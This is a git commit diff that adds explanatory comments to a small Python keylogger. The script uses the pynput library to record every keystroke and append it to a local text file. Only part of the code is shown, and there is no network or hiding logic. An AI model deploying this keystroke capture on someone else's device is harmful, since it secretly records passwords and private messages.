0bf0e1279e7a91dc3f1acdc9a86ef98e40c83f50
PamPamPanda22 <seanchan2006@gmail.com>
2024-07-30 16:43:57 -0500

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,8 +1,9 @@
-from pynput import keyboard
+#First install pynput with <pip install pynput>
+from pynput import keyboard #Import the keyboard package from pynput library
 
 def keyPressed(key):
     print(str(key))
-    with open("darknetalien.txt", 'a')as logKey:
+    with open("darknetalien.txt", 'a')as logKey: #take all logged key inputs and append to the txt document named "darknetalien.txt"
         try:
             char = key.char
             logKey.write(char)
